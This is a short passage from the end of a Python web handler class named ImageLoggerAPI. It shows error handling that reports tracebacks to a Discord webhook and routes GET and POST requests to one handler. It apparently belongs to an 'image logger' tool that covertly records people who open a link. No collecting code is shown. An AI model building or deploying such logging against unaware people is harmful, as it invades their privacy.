            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
